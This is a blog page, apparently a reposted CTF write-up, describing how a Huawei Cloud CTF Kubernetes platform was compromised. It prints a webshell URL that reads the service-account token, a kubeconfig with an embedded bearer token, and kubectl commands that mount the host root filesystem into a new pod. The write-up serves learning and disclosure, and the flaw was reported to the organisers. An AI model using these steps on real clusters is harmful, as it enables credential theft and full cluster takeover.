@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+  <meta charset="UTF-8">
+  <meta
+    name="google-site-verification"
+    content="SOV2AQ5p6fuPfuCqmBECQgKXvyh9SKgTVxmNEVrLvqE" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta
+    http-equiv="X-UA-Compatible"
+    content="ie=edge">
+  <meta
+    name="theme-color"
+    content="#fff"
+    id="theme-color">
+  <meta
+    name="description"
+    content="HDU | Vidar-Team | Web">
+  <link
+    rel="icon"
+    href="/img/Liki4.jpg">
+  <title>华为云 CTF cloud 非预期解之 k8s 渗透实战</title>
+  
+    
+      <meta
+        property="og:title"
+        content="华为云 CTF cloud 非预期解之 k8s 渗透实战">
+    
+    
+      <meta
+        property="og:url"
+        content="https://me.liki.link/20201230/%E5%8D%8E%E4%B8%BA%E4%BA%91-CTF-cloud-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8B-k8s-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/index.html">
+    
+    
+      <meta
+        property="og:img"
+        content="/img/Liki4.jpg">
+    
+    
+      <meta
+        property="og:img"
+        content="HDU | Vidar-Team | Web">
+    
+    
+      <meta
+        property="og:type"
+        content="article">
+      <meta
+        property="og:article:published_time"
+        content="2020-12-30">
+      <meta
+        property="og:article:modified_time"
+        content="2021-10-18">
+      <meta
+        property="og:article:author"
+        content="Switch">
+      
+        
+          <meta
+            property="og:article:tag"
+            content="CTF WriteUp">
+        
+      
+    
+  
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+    function loadCSS(href, data, attr) {
+      var sheet = document.createElement('link');
+      sheet.ref = 'stylesheet';
+      sheet.href = href;
+      sheet.dataset[data] = attr;
+      document.head.appendChild(sheet);
+    }
+    function changeCSS(cssFile, data, attr) {
+      var oldlink = document.querySelector(data);
+      var newlink = document.createElement("link");
+      newlink.setAttribute("rel", "stylesheet");
+      newlink.setAttribute("href", cssFile);
+      newlink.dataset.prism = attr;
+      document.head.replaceChild(newlink, oldlink);
+    }
+  </script>
+  
+    
+      
+      
+      
+      
+        
+        
+        
+        <script>
+          function prismThemeChange() {
+            if(document.getElementById('theme-color').dataset.mode === 'dark') {
+              if(document.querySelector('[data-prism]')) {
+                changeCSS('/js/lib/prism/prism-twilight.min.css', '[data-prism]', 'prism-twilight');
+              } else {
+                loadCSS('/js/lib/prism/prism-twilight.min.css', 'prism', 'prism-twilight');
+              }
+            } else {
+              if(document.querySelector('[data-prism]')) {
+                changeCSS('/js/lib/prism/prism.min.css', '[data-prism]', 'prism');
+              } else {
+                loadCSS('/js/lib/prism/prism.min.css', 'prism', 'prism');
+              }
+            }
+          }
+          prismThemeChange()
+        </script>
+      
+      
+        
+        <link rel="stylesheet" href="/js/lib/prism/prism-line-numbers.min.css">
+      
+    
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+  </script>
+  
+    <script>
+      var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+        prismThemeChange();
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+        prismThemeChange();
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
+        prismThemeChange();
+      }
+    };
+    setDarkmode();
+    </script>
+  
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+    
+    <link rel="prefetch" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js" as="script">
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+  
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Liki4" type="application/atom+xml">
+</head>
+
+  <body>
+    <div class="wrapper">
+       
+      <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+        <img 
+          class="navbar-logo-img" 
+          src="/img/Liki4.jpg" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">Liki4</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+      <a 
+        href="/" 
+        class="navbar-menu-item">
+        
+          首页
+        
+      </a>
+    
+      <a 
+        href="/archives" 
+        class="navbar-menu-item">
+        
+          归档
+        
+      </a>
+    
+      <a 
+        href="/tags" 
+        class="navbar-menu-item">
+        
+          标签
+        
+      </a>
+    
+      <a 
+        href="/categories" 
+        class="navbar-menu-item">
+        
+          分类
+        
+      </a>
+    
+      <a 
+        href="/about" 
+        class="navbar-menu-item">
+        
+          关于
+        
+      </a>
+    
+      <a 
+        href="/links" 
+        class="navbar-menu-item">
+        
+          友链
+        
+      </a>
+    
+    <a 
+      class="navbar-menu-item darknavbar" 
+      id="dark">
+      <i class="iconfont icon-weather"></i>
+    </a>
+    <a 
+      class="navbar-menu-item searchnavbar" 
+      id="search">
+      <i 
+        class="iconfont icon-search" 
+        style="font-size: 1.2rem; font-weight: 400;">
+      </i>
+    </a>
+  </div>
+</nav> 
+      
+      <div 
+        id="local-search" 
+        style="display: none">
+        <input
+          class="navbar-menu-item"
+          id="search-input"
+          placeholder="请输入搜索内容..." />
+        <div id="search-content"></div>
+      </div>
+      
+      <div class="section-wrap">
+        <div class="container">
+          <div class="columns">
+            <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      华为云 CTF cloud 非预期解之 k8s 渗透实战
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2020-12-30T04:02:14.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2020-12-30</span>
+    </time>
+    
+    
+      <span class="dot"></span>
+      <span>2.6k 字</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/CTF-WriteUp/" 
+            class="post-meta-link">
+            CTF WriteUp
+          </a>
+        
+      </div>
+    </div>
+  
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>转载自 Annevi</p>
+<p>当时打比赛的时候觉得这是个很有意思的过程</p>
+<p>转载记录一下</p>
+<h2 id="0x00-题目入口发现"><a href="#0x00-题目入口发现" class="headerlink" title="0x00 题目入口发现"></a>0x00 题目入口发现</h2><p>拿到题目发现是一个类似于提供<code>IaaS</code>服务的站点，扫描了一波目录，发现几个文件以及路由:</p>
+<pre class="line-numbers language-none"><code class="language-none">phpinfo.php
+robots.txt
+admin&#x2F;
+login&#x2F;
+static&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>挺奇怪的是，在一个存在phpinfo的环境下发现了一个<code>beego</code>框架后端的403界面：</p>
+<p><img src="https://cdn.annevi.cn/image-20201220213938432.png" alt="image-20201220213938432" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220213938432.png" class="lozad post-image"></p>
+<p>初步猜测是<code>.php</code>的文件交给了nginx fastcgi进行处理，而其他路由则是交给了<code>beego</code>进行处理。</p>
+<p>接着我们先看<code>/admin</code>路由，发现存在一个隐藏的表单</p>
+<p><img src="https://cdn.annevi.cn/image-20201220142429113.png" alt="image-20201220142429113" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220142429113.png" class="lozad post-image"></p>
+<p>因此自然的想到使用burpsuite进行弱口令的爆破，发现存在弱口令 <code>admin:admin</code></p>
+<p>登录成功后返回了两个url， 下载 <code>tools.zip</code>，同时根据名字猜测<code>/wsproxy</code>是一个websocket的代理路由，而查看tools的源码发现是一个wsproxy的客户端程序。</p>
+<p><img src="https://cdn.annevi.cn/image-20201220142540954.png" alt="image-20201220142540954" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220142540954.png" class="lozad post-image"></p>
+<p>至此，我们找到了进入内网的通道。</p>
+<h2 id="0x01-wsproxy-进入内网"><a href="#0x01-wsproxy-进入内网" class="headerlink" title="0x01 wsproxy 进入内网"></a>0x01 wsproxy 进入内网</h2><p>直接对拿到的tools源码进行编译，获得客户端连接程序</p>
+<p><img src="https://cdn.annevi.cn/image-20201220193029128.png" alt="image-20201220193029128" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220193029128.png" class="lozad post-image"></p>
+<p>根据使用说明，我们可以通过简单的命令连接上题目的<code>wsproxy</code>,同时密码为tools源码目录下的 <code>pass.txt</code>(UAF)，session就是我们登陆admin后，题目给的<code>beego session</code></p>
+<p><img src="https://cdn.annevi.cn/image-20201220193124576.png" alt="image-20201220193124576" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220193124576.png" class="lozad post-image"></p>
+<p>这样会在本地的1080端口开启一个 socks5 代理，通过这个代理，我们就能够连入内网。</p>
+<h2 id="0x02-phpinfo泄露k8s集群信息"><a href="#0x02-phpinfo泄露k8s集群信息" class="headerlink" title="0x02 phpinfo泄露k8s集群信息"></a>0x02 phpinfo泄露k8s集群信息</h2><p>由于这道题目的名称 <code>Cloud</code>以及在<code>phpinfo.php</code> 环境变量 中发现的大量service的信息以及<code>k8s api-server</code>地址，同时根据环境变量的名称与值来看，这是一个k8s集群。而我们的题目属于k8s集群中的一个pod。</p>
+<p><img src="https://cdn.annevi.cn/image-20201220142706608.png" alt="image-20201220142706608" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220142706608.png" class="lozad post-image"></p>
+<h2 id="0x03-k8s基础架构介绍"><a href="#0x03-k8s基础架构介绍" class="headerlink" title="0x03 k8s基础架构介绍"></a>0x03 k8s基础架构介绍</h2><p>在继续深入下去之前，我们需要了解k8s的一些基础架构</p>
+<p><img src="https://cdn.annevi.cn/architecture.png" alt="architecture" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/architecture.png" class="lozad post-image"></p>
+<p>如上图所示，我们可以看到，Kubernetes集群主要分为 <code>Master</code>和<code>Node</code> 两部分，也是典型的分布式架构。</p>
+<p>首先，外部应用程序通过<code>Api-Server</code>提供的 <code>HTTP</code> 接口与<code>Master</code>进行交互，而在与<code>APIs</code>进行交互前，需要经过一步认证的阶段。而 <code>Node</code>由多个<code>pod</code>组成，<code>pod</code>中运行着的便是大家比较熟悉的<code>容器</code>(通常来说是docker)，编写的服务(app)就运行在这些pod中的容器内。</p>
+<p>其次，我们若是想将我们的pod发布出去，使其能够被公开访问，就需要了解<code>服务(Service)</code>。我们将运行在一组 <code>Pods</code> 上的应用程序公开为网络服务的抽象方法称作<code>服务</code>，<code>服务</code>上一般配置了能够被公开访问的 <strong>ip地址</strong>、<strong>端口映射关系</strong>等，通过服务我们就能够访问到相应的pods。</p>
+<p>每一个<code>Node</code>上都有一个被称作<code>节点代理</code>的程序 <code>kubelet</code>，<code>Node</code>通过该程序向<code>Api-Server</code>汇报节点信息，以及接受相应的指令等。</p>
+<p>从上面的架构中不难看出，如果我们要拿下整个集群，从外部看实际上就是需要获得暴露在外的<code>api-server</code>提供的REST api的访问权限。</p>
+<h2 id="0x04-k8s-认证-token-泄露-配置不当"><a href="#0x04-k8s-认证-token-泄露-配置不当" class="headerlink" title="0x04 k8s 认证 token 泄露 + 配置不当"></a>0x04 k8s 认证 token 泄露 + 配置不当</h2><p>通过上面一步浅显的解了一下k8s的基础架构，我们可以继续往下看。</p>
+<p>我们通过给的代理程序连接内网，访问<code>phpinfo</code>中泄露的 k8s api-server <code>https://10.247.0.1:443</code>，发现<code>api-server</code>居然暴露在代理能够<strong>直接访问</strong>到的网段上，但是直接访问提示我们401未授权，因此我们需要寻找一种可能的方式去通过此认证。</p>
+<p><img src="https://cdn.annevi.cn/image-20201220142743378.png" alt="image-20201220142743378" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220142743378.png" class="lozad post-image"></p>
+<p>根据<code>phpinfo.php</code>文件中的内容来看，该集群中部署了很多很多的services，因此我们猜测所有的题目容器应该都是通过这个k8s进行编排管理的。</p>
+<p>同时由于k8s集群部署的时候默认会在每个<code>pod</code>容器中挂载token文件到<br><code>/run/secrets/kubernetes.io/serviceaccount/token</code><br>文件中，因此我们是可以通过其他题目所拿到的shell拿到这个token。</p>
+<blockquote>
+<p>ServiceAccount 主要包含了三个内容：namespace、Token 和 CA。namespace 指定了 pod 所在的 namespace，CA 用于验证 apiserver 的证书，token 用作身份验证。它们都通过 mount 的方式保存在 pod 的文件系统中，其中 token 保存的路径是 /var/run/secrets/kubernetes.io/serviceaccount/token ，是 apiserver 通过私钥签发 token 的 base64 编码后的结果</p>
+</blockquote>
+<p>我们可以通过之前在 <code>webshell_1</code>题目所拿到的webshell，获取到<code>api-server</code>认证token</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;124.70.199.12:32003&#x2F;upload&#x2F;71a6e9b8-90b6-4d4f-9acd-bd91c8bbcc5e.jsp?pwd&#x3D;023&amp;i&#x3D;cat%20&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;token<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.annevi.cn/image-20201220143016309.png" alt="image-20201220143016309" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220143016309.png" class="lozad post-image"></p>
+<p>至此，我们已经获得了<code>api-server</code>的访问权限，因此就相当于我们获取了k8s集群中的<code>master</code>权限。</p>
+<h2 id="0x05-获取集群操纵权限"><a href="#0x05-获取集群操纵权限" class="headerlink" title="0x05 获取集群操纵权限"></a>0x05 获取集群操纵权限</h2><p>拿到了<code>api-server</code>的权限，我们就能够随心所欲的在集群中做想做的事了~ 其实做到这一步，大概就意识到这应该是一个<strong>平台漏洞</strong>，而不是本题的预期解法。因为拿到了<code>master</code>权限之后，我们已经能够查看/控制所有的<code>Pods</code>(web题目)，随意的获取我们想要题目的flag。</p>
+<p>我们可以通过命令行工具 <code>kubectl</code>来对<code>api-server</code>进行操作。</p>
+<p>创建一个<code>k8s.yaml</code>配置文件，如下，token处为我们上面拿到的token，server则填写 api-server的地址</p>
+<pre class="line-numbers language-none"><code class="language-none">apiVersion: v1
+clusters:
+- cluster:
+    insecure-skip-tls-verify: true
+    server: https:&#x2F;&#x2F;10.247.0.1
+  name: cluster-name
+contexts:
+- context:
+    cluster: cluster-name
+    namespace: test
+    user: admin
+  name: admin
+current-context: admin
+kind: Config
+preferences: &#123;&#125;
+users:
+- name: admin
+  user:
+    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tbDh4OGIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjZiYTQzN2JkLTlhN2EtNGE0ZS1iZTk2LTkyMjkyMmZhNmZiOCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.XDrZLt7EeMVlTQbXNzb2rfWgTR4DPvKCpp5SftwtfGVUUdvDIOXgYtQip_lQIVOLvtApYtUpeboAecP8fTSVKwMsOLyNhI5hfy6ZrtTB6dKP0Vrl70pwpEvoSFfoI0Ej_NNPNjY3WXkCW5UG9j9uzDMW28z-crLhoIWknW-ae4oP6BNRBID-L1y3NMyngoXI2aaN9uud9M6Bh__YJi8pVxxg2eX9B4_FdOM8wu9EvfVlya502__xGMCZXXx7aHLx9_yzAPEtxUiI6oECo4HYUtyCJh_axBcNJZmwFTNEWp1DB3QcImBXr9P1qof9H1fAu-z12KLfC4-T3dnKLR9q5w<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在本机通过题目的内网代理 执行以下命令远程连接进入题目的k8s集群，成功通过认证。</p>
+<pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml cluster-info --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.annevi.cn/image-20201220194341279.png" alt="image-20201220194341279" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220194341279.png" class="lozad post-image"></p>
+<p>至此，我们得到了访问<code>k8s api-server</code>的权限，下面我们尝试去获取<strong>集群master宿主机</strong>的权限。</p>
+<p>通过执行</p>
+<pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml version --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.annevi.cn/image-20201220230951253.png" alt="image-20201220230951253" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220230951253.png" class="lozad post-image"></p>
+<p>可以看到，k8s的版本号为 <code>v1.15.11</code>，这个版本的<code>k8s</code>授权默认是不会开启<code>RBAC(基于角色的访问控制)</code>的。</p>
+<blockquote>
+<p>在Kubernetes中，授权有ABAC（基于属性的访问控制）、RBAC（基于角色的访问控制）、Webhook、Node、AlwaysDeny（一直拒绝）和AlwaysAllow（一直允许）这6种模式。从1.6版本起，Kubernetes 默认启用RBAC访问控制策略。从1.8开始，RBAC已作为稳定的功能。</p>
+</blockquote>
+<p>因此如果运维在搭建集群环境的时候，没有设置 <code>--authorization-mode=RBAC</code> ，那么我们就可以通过拿下集群中的一个<code>pod</code>的shell，从而获取到token进行<code>api-server</code>的认证。很显然，经过上面的验证，<strong>运维在部署环境时并没有开启该访问控制</strong>。</p>
+<h2 id="0x06-获取master-宿主机权限"><a href="#0x06-获取master-宿主机权限" class="headerlink" title="0x06 获取master 宿主机权限"></a>0x06 获取master 宿主机权限</h2><p>我们可以创建一个新的<code>pod</code>，通过<strong>文件挂载</strong>的方式，将宿主机根目录的所有文件挂载到<code>pod</code>中，但是由于创建<code>pod</code>时，需要从远程地址上拉取镜像，而该题内网貌似是无法出网的，因此我们需要找一个已经拉取下来的本地镜像文件。</p>
+<p>执行以下命令，获取当前已经拉取过的images:</p>
+<pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml get pods --all-namespaces --insecure-skip-tls-verify&#x3D;true -o jsonpath&#x3D;&quot;&#123;..image&#125;&quot; |\
+tr -s &#39;[[:space:]]&#39; &#39;\n&#39; |\
+sort |\
+uniq -c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>结果如下：</p>
+<p><img src="https://cdn.annevi.cn/image-20201220235708354.png" alt="image-20201220235708354" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220235708354.png" class="lozad post-image"></p>
+<p>尝试几个镜像后，发现 <code>100.125.4.222:20202/hwofficial/coredns:1.15.6</code>是可以使用的</p>
+<p>yaml配置如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">apiVersion: v1
+kind: Pod
+metadata:
+  name: test-444
+spec:
+  containers:
+  - name: test-444
+    image: 100.125.4.222:20202&#x2F;hwofficial&#x2F;coredns:1.15.6
+    volumeMounts:
+    - name: host
+      mountPath: &#x2F;host
+  volumes:
+  - name: host
+    hostPath:
+      path: &#x2F;
+      type: Directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上述配置将宿主机的根目录挂载到了我们pod中的 <code>/host</code>目录，执行以下命令在default命名空间中创建该pod</p>
+<pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml apply -f pod.yaml -n default --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>再通过kubectl exec 进入我们的pod中，以实现对宿主机文件的控制。</p>
+<pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml exec -it test-444 bash -n default --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>至此，我们所获得的权限其实已经和主办方运维同样高了。。</p>
+<h2 id="0x07-获取flag"><a href="#0x07-获取flag" class="headerlink" title="0x07 获取flag"></a>0x07 获取flag</h2><p>通过以上的步骤，大概明白了这是一个非预期，平台配置token的泄露外加没有开启<code>RBAC</code>授权，导致我们轻易的就能够获取到了k8s集群的最高权限。因此我们也就获得了该集群中所有题目容器的最高权限。</p>
+<p>在整个集群中，我们需要寻找属于我们队伍的pod，以便获得对应的flag。</p>
+<p>因此我们首先通过查询在k8s中用于服务暴露的service信息：</p>
+<pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml get services -n default --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.annevi.cn/image-20201220210356220.png" alt="image-20201220210356220" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220210356220.png" class="lozad post-image"></p>
+<p>可以看到，列出了所有的service，同时还有集群ip以及端口映射的关系。这里我们就可以通过暴露在公网上的端口，来定位对应的service。</p>
+<p>例如我们的公网端口为30067，则我们搜索30067端口</p>
+<p><img src="https://cdn.annevi.cn/image-20201220210520978.png" alt="image-20201220210520978" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220210520978.png" class="lozad post-image"></p>
+<p>得到了我们题目pod所在的service，接着我们获取这个service的详细信息，以便得到<code>pod name</code>，命令如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml describe service guosai-34-15-service-c521637e -n default --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.annevi.cn/image-20201220210704982.png" alt="image-20201220210704982" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220210704982.png" class="lozad post-image"></p>
+<p>从这里大致可以看出，app名为<code>guosai-34-15</code>，因此我们相应的去所有的pod中寻找名为这一项的pod。</p>
+<pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml describe pods guosai-34-15-service-c521637e -n default --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>通过对我们获取的数据的检索，发现了这样一个pod，通过比较虚拟ip与phpinfo中的信息，可以确定这个pod就是我们要找的那个。</p>
+<p><img src="https://cdn.annevi.cn/image-20201220210832990.png" alt="image-20201220210832990" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220210832990.png" class="lozad post-image"></p>
+<p>因此便得到了属于我们的pod。exec进入pod后，便可以得到flag。</p>
+<h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>在拿下master之后，我们立即联系了赛事主办方，经过确认这是一个平台的严重安全漏洞~也得到了主办方的感谢。</p>
+<p><img src="https://cdn.annevi.cn/image-20201228105129055.png" alt="image-20201228105129055" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201228105129055.png" class="lozad post-image"></p>
+<p><img src="https://cdn.annevi.cn/image-20201228105105601.png" alt="image-20201228105105601" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201228105105601.png" class="lozad post-image"></p>
+<p><img src="https://cdn.annevi.cn/image-20201228105113374.png" alt="image-20201228105113374" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201228105113374.png" class="lozad post-image"></p>
+<p>之前学习云原生架构和安全相关知识的时候，一直找不到一个很好的实践方式，而这次华为云专场比赛CLOUD第一次让我接触到了真正的☁️云环境下的安全问题，虽说是通过非预期的方式解出了题目，不过这个非预期却让我们较为容易的拿到了整个集群的最高权限，还是挺意外的。</p>
+
+  </div>
+  <div>
+    
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            Switch
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://me.liki.link/20201230/%E5%8D%8E%E4%B8%BA%E4%BA%91-CTF-cloud-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8B-k8s-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/">
+            https://me.liki.link/20201230/%E5%8D%8E%E4%B8%BA%E4%BA%91-CTF-cloud-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8B-k8s-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/
+          </a>
+        </p>
